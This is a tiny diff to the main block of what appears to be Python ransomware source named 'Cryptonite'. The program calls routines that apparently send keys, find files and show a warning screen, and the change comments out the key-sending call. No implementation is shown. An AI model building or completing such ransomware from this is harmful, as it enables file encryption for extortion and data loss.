@@ -252,6 +252,6 @@ if __name__ == "__main__":
     cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
     window = System()
 
-    cryptn8.sendKeys()
+    # cryptn8.sendKeys()
     cryptn8.findFiles()
     window.warningScreen()
